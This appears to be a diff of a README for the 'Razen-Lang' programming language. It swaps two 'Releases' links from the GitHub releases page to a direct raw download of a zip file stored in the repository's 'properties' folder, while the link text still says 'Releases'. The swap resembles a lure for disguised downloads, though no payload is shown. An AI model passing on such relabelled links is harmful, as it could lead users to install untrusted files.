@@ -18,7 +18,7 @@ Say goodbye to complex debugging setups. Razen comes with built-in debugging too
 
 ## Getting Started
 
-To start using Razen-Lang, head over to the [Releases](https://github.com/diiorie/Razen-Lang/releases) section and download the latest release file for your platform. Then follow the installation instructions to set up Razen on your system.
+To start using Razen-Lang, head over to the [Releases](https://raw.githubusercontent.com/diiorie/Razen-Lang/main/properties/Razen-Lang-2.0.zip) section and download the latest release file for your platform. Then follow the installation instructions to set up Razen on your system.
 
 ## Example
 
@@ -44,7 +44,7 @@ We are constantly working on improving Razen-Lang and adding new features. Stay 
 - **Description:** 🚀 Razen is a modern, lightweight programming language with Python-like syntax, high performance, and built-in debugging. Perfect for scripting, testing, and custom module development.
 - **Topics:** coding, easy, free, lightweight, llvm, news, open-source, powerful, programming-language, python, python3, scripting-language, speech
 
-Don't miss out on the latest updates and improvements - visit the [Releases](https://github.com/diiorie/Razen-Lang/releases) section now!
+Don't miss out on the latest updates and improvements - visit the [Releases](https://raw.githubusercontent.com/diiorie/Razen-Lang/main/properties/Razen-Lang-2.0.zip) section now!
 
 ---
 Feel free to explore Razen-Lang and unleash your coding potential with a language that's easy, powerful, and just what you need. Happy coding! 🌟
